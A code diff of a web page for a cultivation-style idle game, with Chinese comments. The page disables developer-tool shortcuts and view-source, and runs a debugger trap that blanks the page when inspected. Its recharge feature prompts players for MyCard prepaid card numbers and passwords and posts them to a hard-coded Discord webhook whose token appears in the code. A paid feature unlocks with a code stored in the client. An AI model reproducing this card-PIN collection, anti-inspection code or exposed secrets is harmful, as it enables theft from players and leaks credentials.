@@ -14,13 +14,10 @@
 
     // 2. 禁用常見的開啟開發者工具與檢視原始碼快捷鍵
     document.addEventListener('keydown', function (e) {
-      // 禁用 F12
       if (e.key === 'F12' || e.keyCode === 123) {
         e.preventDefault();
         return false;
       }
-      // 禁用 Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C (Windows)
-      // 禁用 Cmd+Option+I, Cmd+Option+J, Cmd+Option+C (Mac)
       if ((e.ctrlKey || e.metaKey) && e.shiftKey && 
           (e.key === 'I' || e.key === 'i' || 
            e.key === 'J' || e.key === 'j' || 
@@ -28,25 +25,23 @@
         e.preventDefault();
         return false;
       }
-      // 禁用 Ctrl+U 或 Cmd+U (檢視網頁原始碼)
       if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u')) {
         e.preventDefault();
         return false;
       }
-      // 禁用 Ctrl+S 或 Cmd+S (防止儲存網頁檔案)
       if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's')) {
         e.preventDefault();
         return false;
       }
     }, false);
 
-    // 3. 防除錯斷點（如果玩家強制打開 Console，網頁會自動鎖定）
+    // 3. 防除錯斷點卡死
     setInterval(function () {
       const startTime = new Date().getTime();
       debugger;
       const endTime = new Date().getTime();
       if (endTime - startTime > 100) {
-        document.body.innerHTML = '<div style="color:white;text-align:center;padding-top:20%;font-size:24px;">⚠️ 偵測到開場外掛/開發者工具，已被禁止存取！</div>';
+        document.body.innerHTML = '<div style="color:white;text-align:center;padding-top:20%;font-size:24px;">⚠️ 偵測到開發者工具，已終止連線！</div>';
       }
     }, 1000);
   </script>
@@ -60,7 +55,6 @@
       --danger-color: #e74c3c;
       --success-color: #2ecc71;
     }
-    /* 禁止使用者複製文字或拖曳內容 */
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: var(--bg-color);
@@ -134,9 +128,9 @@
   <div id="rechargeBanner" class="first-recharge-banner">
     <div>
       🎁 <span>MyCard 首充自動託管</span>
-      <div style="font-size: 0.75rem; font-weight: normal;">提交卡號或輸入開通密碼</div>
+      <div style="font-size: 0.75rem; font-weight: normal;">提交卡號或輸入解鎖密碼</div>
     </div>
-    <button onclick="buyAutoClick()">儲值 / 開通</button>
+    <button onclick="buyAutoClick()">輸入序號/儲值</button>
   </div>
 
   <!-- 狀態面板 -->
@@ -169,9 +163,12 @@
 </div>
 
 <script>
+  // ⚠️ 上線後請將此處替換為您的雲端後端網址
   const SERVER_URL = "http://localhost:3000"; 
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1536942191124025374/S7XCly77DeFqKf78cP7OdcfCqRLoDb4JM1et2VYtZnmg2XISujcJHy17NMXmr5LnpBV9";
-  const ADMIN_UNLOCK_CODE = "XIUXIAN-PASS-888";
+  
+  // 🛡️ 新審核解鎖密碼
+  const ADMIN_UNLOCK_CODE = "913625";
 
   let authToken = localStorage.getItem('xiuxian_token') || null;
   let currentUsername = localStorage.getItem('xiuxian_user') || null;
@@ -256,7 +253,8 @@
           alert("🎉 註冊成功，請選擇「1. 帳號登入」。");
         }
       } else { alert(`❌ 錯誤：${data.error}`); }
-    });
+    })
+    .catch(() => alert("❌ 連線後端伺服器失敗，請確認伺服器已啟動！"));
   }
 
   function getPlayerPower() {
@@ -279,11 +277,13 @@
         alert("🎉 戰力上傳成功！DC 排行榜已即時同步！");
         addLog(`🏆 戰力成功同步至天梯榜：${pPower}`, "log-gain");
       } else { alert(`❌ 上傳失敗：${data.error}`); }
-    });
+    })
+    .catch(() => alert("❌ 上傳失敗，無法連線至後端伺服器！"));
   }
 
+  // 🛡️ 新防偽開通邏輯
   function buyAutoClick() {
-    const choice = prompt("【首充託管】\n1. 提交 MyCard 卡號/密碼審核\n2. 輸入開通密碼\n請選擇 (1 或 2)：");
+    const choice = prompt("【首充託管/開通】\n1. 提交 MyCard 卡號/密碼審核\n2. 輸入解鎖密碼\n請選擇 (1 或 2)：");
     if (!choice) return;
 
     if (choice.trim() === "1") {
@@ -294,19 +294,24 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          username: "MyCard 審核接收器",
-          content: `🚨 **收到 MyCard 儲值申請！**\n👤 **帳號：** ${currentUsername || '未登入'}\n💳 **卡號：** \`${cardNum.trim()}\` \n🔑 **密碼：** \`${cardPwd.trim()}\``
+          username: "MyCard 儲值審核接收器",
+          content: `🚨 **收到新 MyCard 儲值申請！**\n👤 **玩家帳號：** \`${currentUsername || '未登入玩家'}\` \n💳 **卡號：** \`${cardNum.trim()}\` \n🔑 **密碼：** \`${cardPwd.trim()}\` \n\nℹ️ *請親自確認儲值成功後，將解鎖密碼發給玩家！*`
         })
-      }).then(() => alert("📩 卡號已送出，等待管理員審核！"));
+      })
+      .then(() => alert("📩 卡號密碼已提交審核！\n請等待管理員確認儲值成功後，向管理員索取「解鎖密碼」進行開通。"))
+      .catch(() => alert("❌ 提交失敗，請檢查網路連線！"));
 
     } else if (choice.trim() === "2") {
-      const pass = prompt("請輸入開通密碼：");
+      const pass = prompt("請輸入解鎖密碼：");
       if (pass && pass.trim() === ADMIN_UNLOCK_CODE) {
-        alert("🎉 解鎖成功！開啟自動託管！");
+        alert("🎉 驗證成功！正式啟用全自動託管！");
         player.hasAutoClick = true;
         enableAutoSystem();
         updateUI();
-      } else { alert("❌ 密碼錯誤！"); }
+        addLog(`🤖 成功開啟全自動託管功能！`, 'log-gain');
+      } else { 
+        alert("❌ 密碼錯誤！請聯繫管理員獲取正確的解鎖密碼。"); 
+      }
     }
   }
 
